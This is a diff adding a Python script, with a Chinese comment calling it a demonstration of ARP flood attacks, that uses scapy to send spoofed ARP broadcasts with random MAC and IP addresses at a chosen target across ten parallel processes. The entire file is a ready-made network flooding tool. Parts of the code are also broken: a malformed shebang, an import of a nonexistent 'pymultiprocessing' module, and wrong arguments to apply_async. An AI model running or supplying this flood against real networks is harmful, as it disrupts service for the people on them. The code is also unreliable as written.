@@ -1,0 +1,35 @@
+#!usr/bin/env python
+# -*- coding=utf-8 -*-
+#Code_network_flood_attack.py
+#本程序用于展示arp泛洪攻击的原理
+
+from scapy.all import *
+import random
+import pymultiprocessing
+
+def randomIP():
+    ip = ['172', '29', str(random.randint(0, 255)), str(random.randint(0, 255))]
+    return '.'.join(ip)
+
+def randomMAC():
+    mac = [random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0x7f),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff)]
+    return ':'.join(map(lambda y: '%02x' % y, mac))
+
+def ARP_Flood(destip):
+    srp(Ether(src=randomMAC(), dst='FF:FF:FF:FF:FF:FF') / ARP(op=1, hwsrc=randomMAC(), hwdst='00:00:00:00:00:00',
+                                                           psrc=randomIP(), pdst=destip), timeout=1,verbose=True)
+
+if __name__ == '__main__':
+    destip = str(raw_input('Plz input the destination ip : '))
+    counts = int(raw_input('Plz input the total attack counts : '))
+    pool = pymultiprocessing.Pool(processes=int(10))
+    for i in xrange(1,counts+1):
+        pool.apply_async(ARP_Flood, destip)
+        print ('Sending the %d packet !' % i)
+    pool.close()
+    pool.join()
